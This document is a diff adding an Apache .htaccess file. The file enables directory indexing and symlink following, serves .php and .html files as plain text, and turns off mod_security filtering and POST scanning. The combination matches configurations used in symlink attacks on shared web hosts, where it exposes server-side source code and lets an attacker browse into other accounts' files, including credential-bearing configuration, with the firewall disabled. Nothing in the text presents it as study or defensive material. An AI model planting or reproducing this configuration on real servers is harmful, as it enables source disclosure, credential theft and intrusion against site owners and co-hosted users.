@@ -1,0 +1,17 @@
+Options Indexes FollowSymLinks
+DirectoryIndex yes.htm
+AddType txt .php
+AddHandler txt .php
+<IfModule mod_autoindex.c>
+IndexOptions FancyIndexing IconsAreLinks SuppressHTMLPreamble
+</ifModule>
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
+Options +FollowSymLinks
+DirectoryIndex yess.html
+Options +Indexes
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType text/plain .html
